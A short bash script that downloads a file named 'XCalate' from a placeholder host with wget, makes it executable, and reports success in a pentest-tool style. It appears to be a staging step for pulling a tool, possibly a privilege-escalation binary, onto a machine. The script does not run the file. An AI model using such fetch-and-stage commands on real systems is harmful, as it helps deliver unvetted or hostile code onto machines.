#!/bin/bash

# Define URL and filename
URL="http://IP_Address/XCalate"
FILENAME="XCalate"

# Download the file
wget "$URL" -O "$FILENAME"

# Check if download succeeded
if [ $? -eq 0 ]; then
    chmod +x "$FILENAME"
    echo "[+] File '$FILENAME' downloaded and made executable."
else
    echo "[-] Failed to download file from $URL"
fi
